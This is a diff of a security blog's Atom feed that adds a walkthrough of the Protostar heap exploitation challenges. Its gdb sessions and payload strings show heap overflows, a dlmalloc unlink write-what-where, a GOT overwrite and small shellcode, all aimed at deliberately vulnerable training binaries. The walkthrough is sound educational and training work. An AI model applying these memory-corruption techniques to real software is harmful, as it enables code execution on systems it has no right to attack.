@@ -4,7 +4,7 @@
   <title><![CDATA[Category: protostar | forelsec]]></title>
   <link href="http://hatRiot.github.io/blog/categories/protostar/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2014-09-16T22:47:35-06:00</updated>
+  <updated>2014-09-21T15:58:40-06:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -12,6 +12,400 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar solutions - Heap Exploitation]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits/"/>
+    <updated>2014-09-21T15:10:04-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits</id>
+    <content type="html"><![CDATA[<p>And we&rsquo;re back with Protostar, this time working on the heap section.</p>
+
+<h2>Heap Exploits 0</h2>
+
+<p>Introductory level that demonstrates overflowing heap structures.  It&rsquo;s pretty simple:</p>
+
+<p><code>
+user@protostar:/opt/protostar/bin$ objdump -dt heap0 | grep winner
+08048464 g     F .text  00000014              winner
+08048478 g     F .text  00000014              nowinner
+08048464 &lt;winner&gt;:
+08048478 &lt;nowinner&gt;:
+</code></p>
+
+<p>And then we find our EIP offset:</p>
+
+<p>```
+(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>72 + &ldquo;B&rdquo;</em>4&rsquo;)
+Starting program: /opt/protostar/bin/heap0 $(python -c &lsquo;print &ldquo;A&rdquo;<em>72 + &ldquo;B&rdquo;</em>4&rsquo;)
+data is at 0x804a008, fp is at 0x804a050</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```</p>
+
+<p>Using our mad exploit skills:</p>
+
+<p><code>
+$ ./heap0 $(python -c 'print "A"*72 + "\x64\x84\x04\x08"')
+data is at 0x804a008, fp is at 0x804a050
+level passed
+</code></p>
+
+<h2>Heap Exploits 1</h2>
+
+<p>This challenge dives a bit more into heap exploitation with a nice write-what-where, and the goal is to redirect execution flow to the function <code>winner</code>.  Let&rsquo;s find that first:</p>
+
+<p><code>
+$ objdump -dt heap1 | grep winner
+08048494 g     F .text  00000025              winner
+</code></p>
+
+<p>Now let&rsquo;s check out the actual bug:</p>
+
+<p>```
+(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;B&rdquo;</em>4&rsquo;) xx
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;B&rdquo;</em>4&rsquo;) xx</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+*__GI_strcpy (dest=0x42424242 <Address 0x42424242 out of bounds>, src=0xbffff9a3 &ldquo;xx&rdquo;) at strcpy.c:40
+40  strcpy.c: No such file or directory.</p>
+
+<pre><code>in strcpy.c
+</code></pre>
+
+<p>```</p>
+
+<p>As we can see, we control the source (argument two) and the destination, address one, which is the result of a pointer overflow in the following code:</p>
+
+<p><code>
+strcpy(i1-&gt;name, argv[1]);
+strcpy(i2-&gt;name, argv[2]);
+</code></p>
+
+<p>We have a couple of options for exploitation, but I chose to simply overwrite ebp+4 to take control over the return address.  Let&rsquo;s find that first:</p>
+
+<p>```
+(gdb) b *0x08048566
+Breakpoint 1 at 0x8048566: file heap1/heap1.c, line 35.
+(gdb) r xx yy
+Starting program: /opt/protostar/bin/heap1 xx yy
+and that&rsquo;s a wrap folks!</p>
+
+<p>Breakpoint 1, main (argc=3, argv=0xbffff864) at heap1/heap1.c:35
+35  heap1/heap1.c: No such file or directory.</p>
+
+<pre><code>in heap1/heap1.c
+</code></pre>
+
+<p>(gdb) x/wx $ebp
+0xbffff7b8: 0xbffff838
+```</p>
+
+<p>This shows ebp is located at 0xbffff7b8, so let&rsquo;s overwrite that:</p>
+
+<p>```
+(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;B&rdquo;<em>4&rsquo;)
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;</em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;<em>4 + &ldquo;B&rdquo;</em>4&rsquo;)
+and that&rsquo;s a wrap folks!</p>
+
+<p>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
+35  in heap1/heap1.c
+(gdb) x/wx $ebp
+0xbffff798: 0x41414141
+(gdb) x/wx $ebp+4
+0xbffff79c: 0x42424242
+(gdb)
+```</p>
+
+<p>Note that ebp&rsquo;s address changed; this is a stupid method and is susceptible to stack shifting, so we need to ensure we accomodate for that.  Anyway, now we can control where we return to, so let&rsquo;s pop in our winning address:</p>
+
+<p>```
+(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo;&rsquo;)</p>
+
+<p>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
+35  in heap1/heap1.c
+(gdb) x/wx $ebp
+0xbffff798: 0x41414141
+(gdb) x/wx $ebp+4
+0xbffff79c: 0x08048494
+(gdb) c
+Continuing.
+and we have a winner @ 1410933753</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+(gdb)
+```</p>
+
+<p>And that&rsquo;s all!  Notice we still segfault, this is because we&rsquo;ve totally screwed up the stack, and it&rsquo;s trying to pop another value off the stack and return there.  We can trivally fix that by appending the address for exit:</p>
+
+<p>```
+(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo; + &ldquo;\xc0\x60\xec\xb7&rdquo;&rsquo;)
+Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo; + &ldquo;\xc0\x60\xec\xb7&rdquo;&rsquo;)
+and that&rsquo;s a wrap folks!
+and we have a winner @ 1410933890</p>
+
+<p>Program exited with code 0124.
+(gdb)
+```</p>
+
+<h2>Heap Exploits 2</h2>
+
+<p>This one is pretty simple, and doesn&rsquo;t require us to really exploit much.  What we have is basically a contrived authentication service that&rsquo;s got four commands: auth, reset, service, and login.  The goal is to trigger the &ldquo;you have logged in already!&rdquo; message.  Here&rsquo;s the solution:</p>
+
+<p><code>
+user@protostar:/opt/protostar/bin$ ./heap2
+[ auth = (nil), service = (nil) ]
+auth xx
+[ auth = 0x804c008, service = (nil) ]
+service xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+[ auth = 0x804c008, service = 0x804c018 ]
+login
+you have logged in already!
+[ auth = 0x804c008, service = 0x804c018 ]
+</code></p>
+
+<p>First we auth, which allocates the auth structure:</p>
+
+<p>```
+if(strncmp(line, &ldquo;auth &rdquo;, 5) == 0) {
+  auth = malloc(sizeof(auth));
+  memset(auth, 0, sizeof(auth));
+  if(strlen(line + 5) &lt; 31) {</p>
+
+<pre><code>strcpy(auth-&gt;name, line + 5);
+</code></pre>
+
+<p>  }
+}
+```</p>
+
+<p>Then we execute service with a long string:</p>
+
+<p>```
+if(strncmp(line, &ldquo;service&rdquo;, 6) == 0) {</p>
+
+<pre><code>  service = strdup(line + 7);
+</code></pre>
+
+<p>}
+```</p>
+
+<p>strdup duplicates a string, allocated via malloc.  Note in the auth struct allocation that it&rsquo;s only allocating <code>sizeof(auth)</code>.  This is an incorrect allocation, as it&rsquo;s really just allocating memory for a struct <em>pointer</em>, and not the 30 odd bytes for the structure.  We can easily demonstrate this with multiple auth struct allocations:</p>
+
+<p><code>
+$ ./heap2
+[ auth = (nil), service = (nil) ]
+auth 1
+[ auth = 0x804c008, service = (nil) ]
+auth 2
+[ auth = 0x804c018, service = (nil) ]
+</code></p>
+
+<p>This 16 byte difference is comprised solely of chunk headers.  All we need to do is set the auth flag in the struct to some non-zero value, which can be done with the service command and our arbitrarily long string allocation.</p>
+
+<p>```
+if(strncmp(line, &ldquo;login&rdquo;, 5) == 0) {</p>
+
+<pre><code>if(auth-&gt;auth) {
+  printf("you have logged in already!\n");
+} else {
+  printf("please enter your password\n");
+}
+</code></pre>
+
+<p>  }
+```</p>
+
+<h2>Heap Exploits 3</h2>
+
+<p>This is the level that I thought more of these would be; this level requires us to manipulate heap metadata in order to obtain code execution.  Whilst this method is terribly outdated and not applicable at all to modern heaps, it&rsquo;s still a blast, and many of the high level methods still apply.</p>
+
+<p>I highly, highly recommend reading the essential <a href="http://phrack.org/issues/57/9.html"><em>Once Upon A Free()</em></a> if you&rsquo;re unfamiliar with old school, dlmalloc heap exploitation, as there is quite a bit of prerequisite knowledge necessary to complete this stage.  I&rsquo;ll assume the reader has a cursory understanding of how this process will go down.</p>
+
+<p>Much like the previous stages, we need to redirect the program to another function, <code>winner</code>.  Stage 3 executes three separate, 32 byte malloc&rsquo;s, strcpy&rsquo;s our input into each chunk, then free&rsquo;s them in <a href="http://webcache.googleusercontent.com/search?q=cache:TddtBQ76DO4J:exploit-exercises.com/protostar/heap3+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=us">reverse</a>:</p>
+
+<p>```
+a = malloc(32);
+b = malloc(32);
+c = malloc(32);</p>
+
+<p>strcpy(a, argv[1]);
+strcpy(b, argv[2]);
+strcpy(c, argv[3]);</p>
+
+<p>free&copy;;
+free(b);
+free(a);
+```</p>
+
+<p>Let&rsquo;s first check out the memory layout.  After all three allocations and strcpy&rsquo;s, but before any free&rsquo;s:</p>
+
+<p><code>
+(gdb) x/10wx 0x804c008-8
+0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
+0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000
+(gdb) x/10wx 0x804c030-8
+0x804c028:  0x00000000  0x00000029  0x42424242  0x00000000
+0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c048:  0x00000000  0x00000000
+(gdb) x/10wx 0x804c058-8
+0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
+0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c070:  0x00000000  0x00000000
+(gdb)
+</code></p>
+
+<p>Recall that each chunk has metadata in-channel that allows dlmalloc to traverse, coalesce, and fetch chunks on the heap.  In the above case, three allocated chunks have two requisite fields: <code>prev_size</code> and <code>size</code>.  As none of the previous chunks in the heap have been free&rsquo;d, the<code>prev_size</code> field is 0x0.  The size field is 0x29, or 41.  The lower three bits are reserved in this field, so accounting for that:</p>
+
+<p><code>
+(gdb) p/d 0x29 &amp; ~3
+$1 = 40
+(gdb)      
+</code></p>
+
+<p>These three chunks are then free&rsquo;d in reverse order, starting from chunk c.  Exploitation for this rather straight forward, we just need to overflow adjacent metadata headers to craft an illicit chunk.  Once free enters its unlink macro, we obtain execution flow control.</p>
+
+<p>We need to start by setting the <code>prev_size</code> and <code>size</code> fields to values that allow us to control forward and backward chunk pointers.  We begin by setting both fields to 0xffffffc, or -4.</p>
+
+<p>```
+(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) BBBB CCCC
+Starting program: /opt/protostar/bin/heap3 $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) BBBB CCCC</p>
+
+<p>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff824) at heap3/heap3.c:24
+24  in heap3/heap3.c
+(gdb) x/10wx 0x804c030-8
+0x804c028:  0xfffffffc  0xfffffffc  0x42424242  0x00000000
+0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c048:  0x00000000  0x00000000
+```</p>
+
+<p>We now shift to setting the flink and blink values, which are set once a chunk is freed.  Let&rsquo;s inspect these chunks after all three have been freed:</p>
+
+<p><code>
+(gdb) x/10wx 0x804c008-8
+0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
+0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c020:  0x00000000  0x00000000
+(gdb) x/10wx 0x804c030-8
+0x804c028:  0x00000000  0x00000029  0x0804c050  0x00000000
+0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c048:  0x00000000  0x00000000
+(gdb) x/10wx 0x804c058-8
+0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
+0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c070:  0x00000000  0x00000000
+</code></p>
+
+<p>The value after the <code>size</code> field is a forward pointer to the next free chunk.  There would typically be another pointer in the next field, a backwards link, however, dlmalloc employs what&rsquo;s known as fastbins.  This is a singly-linked list holding recently freed small chunks ( &lt; 64 bytes).  More on this can be found <a href="ftp://g.oswego.edu/pub/misc/malloc-2.7.0.c">here</a>.</p>
+
+<p>Taking a quick peek at the exploitable unlink macro:</p>
+
+<p>```</p>
+
+<h1>define unlink(P, BK, FD)</h1>
+
+<p>{
+  BK = P->bk;
+  FD = P->fd;
+  FD->bk = BK;
+  BK->fd = FD;
+}
+```
+This macro will essentially update chunk pointers to, naturally, unlink a recently freed chunk.  This boils down to:</p>
+
+<p><code>
+*(next-&gt;fd + 12) = next-&gt;bk
+*(next-&gt;bk + 8) = next-&gt;fd
+</code></p>
+
+<p>A simple write-what-where.  If we set fd to <code>return address - 0xc</code>, or the where, then bk is the what and ends up being the value popped into EIP.  Let&rsquo;s test this out by attempting to write 0x42424242 into chunk A:</p>
+
+<p>```
+(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) $(python -c &lsquo;print &ldquo;B&rdquo;<em>4 + &ldquo;\xfc\xbf\x04\x08&rdquo; + &ldquo;B&rdquo;</em>4&rsquo;) CCCC
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /opt/protostar/bin/heap3 $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) $(python -c &lsquo;print &ldquo;B&rdquo;<em>4 + &ldquo;\xfc\xbf\x04\x08&rdquo; + &ldquo;B&rdquo;</em>4&rsquo;) CCCC</p>
+
+<p>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
+24  in heap3/heap3.c
+(gdb) ni 3</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+0x08049906 in free (mem=0x804c030) at common/malloc.c:3638
+3638    common/malloc.c: No such file or directory.
+in common/malloc.c
+(gdb) x/10wx 0x804c008-8
+0x804c000:  0x00000000  0x00000029  0x42424242  0x41414141
+0x804c010:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804c020:  0x41414141  0x41414141
+(gdb)
+```</p>
+
+<p>So we can write a controlled value somewhere.  We&rsquo;ll take the path of least resistance for exploitation and overwrite the GOT entry for puts with the location of our shellcode, which will be a simple jump to the appropriate function.</p>
+
+<p><code>
+$ objdump -t --dynamic-relo ./heap3 | grep puts
+0804b128 R_386_JUMP_SLOT   puts
+</code></p>
+
+<p>and winner:</p>
+
+<p><code>
+(gdb) p winner
+$2 = {void (void)} 0x8048864 &lt;winner&gt;
+</code></p>
+
+<p>Since our return address needs to be at an offset of -0xc, we&rsquo;ll be using <code>0x804b11c</code> as the return address.  It is also worth noting that the first field of the chunk is clobbered during the free routine, so we&rsquo;ll need an offset of +4 there as well.</p>
+
+<p>```
+(gdb) r AAAA$(python -c &lsquo;print &ldquo;A&rdquo;<em>28 + &ldquo;\xfc\xff\xff\xff&rdquo; + &ldquo;\xfc\xff\xff\xff&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;\x41&rdquo;</em>4 + &ldquo;\x1c\xb1\x04\x08&rdquo; + &ldquo;\x0c\xc0\x04\x08&rdquo;&rsquo;) CCCC
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y</p>
+
+<p>Starting program: /opt/protostar/bin/heap3 AAAA$(python -c &lsquo;print &ldquo;A&rdquo;<em>28 + &ldquo;\xfc\xff\xff\xff&rdquo; + &ldquo;\xfc\xff\xff\xff&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;\x41&rdquo;</em>4 + &ldquo;\x1c\xb1\x04\x08&rdquo; + &ldquo;\x0c\xc0\x04\x08&rdquo;&rsquo;) CCCC</p>
+
+<p>Breakpoint 1, 0x08048935 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
+24  heap3/heap3.c: No such file or directory.</p>
+
+<pre><code>in heap3/heap3.c
+</code></pre>
+
+<p>(gdb) x/i $eip
+0x8048935 &lt;main+172>:   call   0x8048790 &lt;puts@plt>
+(gdb) si
+0x08048790 in puts@plt ()
+(gdb) x/i $eip
+0x8048790 &lt;puts@plt>:   jmp    DWORD PTR ds:0x804b128
+(gdb) ni
+0x0804c00c in ?? ()
+(gdb) x/wx $eip
+0x804c00c:  0x41414141
+(gdb)
+```</p>
+
+<p>This gives us about eight bytes until the clobbered field, but this is sufficient for our purposes.  Using metasm, we can generate shellcode for a simple <code>call winner</code>:</p>
+
+<p><code>
+metasm &gt; push 0x08048864; ret
+"\x68\x64\x88\x04\x08\xc3"
+metasm &gt;
+</code></p>
+
+<p><code>
+user@protostar:/opt/protostar/bin$ ./heap3 AAAA$(python -c 'print "\x68\x64\x88\x04\x08\xc3" + "A"*22 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
+that wasn't too bad now, was it? @ 1411285668
+user@protostar:/opt/protostar/bin$
+</code></p>
+
+<p>And that&rsquo;s it!  I really wish this level had more dlmalloc exploitation, or post-2004 stuff (see <a href="http://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt">here</a>), but this was fun as is.  Fusion seems to be an advanced version of Protostar, so here&rsquo;s to hoping there&rsquo;s more there.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Protostar solutions - Format String]]></title>
